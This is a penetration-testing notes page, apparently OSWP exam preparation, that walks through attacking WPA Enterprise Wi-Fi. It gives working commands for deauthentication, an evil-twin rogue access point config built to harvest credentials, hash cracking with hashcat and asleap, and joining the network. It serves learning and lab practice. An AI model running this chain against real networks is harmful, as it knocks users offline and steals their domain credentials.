---
title: WPA Enterpise (WPA-MGT)
source_url: https://notes.incendium.rocks/pentesting-notes/wireless-networks/wpa-enterpise-wpa-mgt
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: wireless
---

## 1. Finding WPA-MGT networks

You can find these on the 2.4ghz and 5ghz signals:

```
# dump 2.4ghz
sudo airodump-ng wlan0mon

# dump 5ghz
sudo airodump-ng -b a wlan0mon
```

In the "auth" column of airodump-ng, check for "MGT".&#x20;

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FOENf7A9r1pWf1YeRuH8C%2Fimage.png?alt=media&amp;token=4f0e01fa-3a89-4cf2-813f-d0b5500b475c" alt=""><figcaption></figcaption></figure>

## 2. Finding the certificate information

To attack WPA Enterprise we build build our own rogue AP, but to do so, we need to create a certificate. We need to make the certificate with the same information as our target. To capture the information, we need to capture a handshake like in WPA2 attacks.

Use airodump-ng to capture the handshake:

```
sudo airodump-ng wlan0mon --bssid F0:9F:C2:71:22:15 -c 44 -w wpamgt
```

Do a deauth attack:

```
sudo aireplay-ng -0 5 -c 64:32:A8:07:6C:40 -a F0:9F:C2:71:22:15 wlan0mon
```

If successful, you will see "WPA handshake: X"

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FVHEITf44awKOghy7yIA9%2Fimage.png?alt=media&amp;token=c078219e-f23d-49d9-8393-6593ceb272b2" alt=""><figcaption></figcaption></figure>

Open the wpamgt.cap file with WireShark and set the filter to tls.handshake.certificate:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FMvf6rDONd3gZGHayfoe0%2Fimage.png?alt=media&amp;token=46fac59b-8961-47fe-bf67-d7f0532abd42" alt=""><figcaption></figcaption></figure>

Now extract the certificate with:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FDdE7NR4PA9xYkMsLwpvr%2F943fb932-8769-4761-b423-e99a2281d1c6.png?alt=media&amp;token=f35611af-e443-401e-b41f-502ba0023d8d" alt=""><figcaption></figcaption></figure>

Save it as "cert.der" and extract the info using:

```
openssl x509 -inform der -in cert.der -text
```

The info we need:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F8Jpw0qURjnwHoY2NFUPH%2Fimage.png?alt=media&amp;token=c2cf1302-2420-4717-8785-915d5f4d4835" alt=""><figcaption></figcaption></figure>

## 3. Setting up Rogue AP

To attack a mistrusted client on an MGT network we have to create a RogueAP with the same ESSID and configuration but with a self-signed certificate, preferably with the same data as the real one in case the client manually verifies the certificate. To do this you can use “eaphammer”.

eaphammer is **not** allowed on the OSWP exam, instead use **freeradius** with hostapd-mana.

```
python3 ./eaphammer --cert-wizard
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fz6jwEY9Ns2slqwubJDnw%2Fimage.png?alt=media&amp;token=3856dfdc-0580-44cd-835b-3ce3bd08f3f6" alt=""><figcaption></figcaption></figure>

When this is completed, setup hostapd-mana with:

```
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fz108dLprC2nbfoqjU9bk%2Fimage.png?alt=media&amp;token=13eaad8a-accd-40df-ad6a-ee3fa11fe7a4" alt=""><figcaption></figcaption></figure>

### 3.1 Using freeradius with hostapd-mana

First of all, install freeradius

```
sudo apt-get install freeradius
```

Go to /etc/freeradius/3/certs and open ca.cnf and server.cnf

Modify the underneath values to the obtained information from the certificate:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F2LElyLsUKvDzuHE5kG7H%2Ffbf487d4-e74f-4052-8b99-6812bf1c1387.png?alt=media&amp;token=b3e3e0a3-856c-46ea-b52d-dda59acbe301" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FizdOrLylwsWYEQcLTo2r%2Fa5b787fc-f280-4c37-b284-ee58c27af701.png?alt=media&amp;token=9fcc56cf-48e7-49f4-b2cf-a4b20459a6dd" alt=""><figcaption></figcaption></figure>

After that we do the following commands under `/etc/freeradius/3.0/certs` to generate `Diffie Hellman key` for `hostapd-mana`

```
rm dh
make
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FtdnV5izN0imFd8WM6Q8y%2F6d7916b3-8f96-4b96-b5dc-ae45125e8b6f.png?alt=media&amp;token=9ede48fe-5638-46dd-93ee-1f62d9b4e3b6" alt=""><figcaption></figcaption></figure>

Next, create a file called `mana.eap_user`

```
*	PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

After that we create a fake access point by creating a file called `network.conf` under any other directory:

```tsconfig
ssid=<ESSID>
interface=<managed_mode_interface>
driver=nl80211

channel=<channel>
hw_mode=a # use 'g' for 5ghz networks
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0

eap_user_file=/etc/hostapd-mana/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key

private_key_passwd=whatever

dh_file=/etc/freeradius/3.0/certs/dh

auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP

wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credoutfile
mana_eapsuccess=1
mana_eaptls=1
```

Make sure to point the mana.easp\_user file to the right directory. Use hostapd-mana to setup the fake AP:

```
sudo hostapd-mana network.conf
```

## 4. Broadcast deauth to all AP's

With “airodump-ng” we detect the MAC of the clients to perform a deauthentication attack. So we do this attack on both clients in parallel. As there are 2 APs we have to perform the attack against the 2 APs, since disconnecting from 1 may connect to the other instead of to our RogueAP..

Delete `-c` option if you want to do it in broadcast (Kick all clients)\
You need to use another interface in monitor mode, Also you need to set the interface to the same channel as the target network before performing the De-authenticate attack, As the following:

```
sudo iwconfig wlan0mon channel 44
```

Next we sent a broadcast deauth to both AP's while our rogue AP is listening:

<pre><code><strong>aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon
</strong>aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0mon
</code></pre>

If succesful we receive a NETNTLM hash:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fpi6CtlNQ3xGXgRebYqqp%2Fimage.png?alt=media&amp;token=55e70e46-decc-47b9-8059-c34432ff3bdf" alt=""><figcaption></figcaption></figure>

## 5. Crack the hash

```
hashcat -a 0 -m 5500 juan.tr::::673256730e43f7a67c712534e0970f86160487ce60e560bc:009f9888b8c646ec /root/rockyou-top100000.txt --force
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FZ2GGxn7idKNTF4wpfL0q%2Fimage.png?alt=media&amp;token=054ea8dc-c7d9-4eee-8a58-ce1e7c5a70c6" alt=""><figcaption></figcaption></figure>

### 5.1 Use asleap

If you cannot use hashcat you can use asleap to get the password instead:

```bash
asleap -C do:3b:8d:7b:22:00:0:91 -R 68:09:13:ac:e8:df:36:5f:42:94:fb:97:91:05:2:21:72:ff:b3:ce:c0:ca:26:f7 -W /usr/share/john/password.lst
```

## 6. Connect to network

Create a hostapd mana config:

```tsconfig
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

Connect:

```
wpa_supplicant -c network.conf -i <interface>
```

Get IP:

```sh
sudo dhclient wlan3
ip addr show wlan3
```

## 7. Sources

<https://zeyadazima.com/notes/oswplaybook/#attacking-wpa-enterprise>&#x20;

<https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#18-what-is-juans-wifi-corp-password>
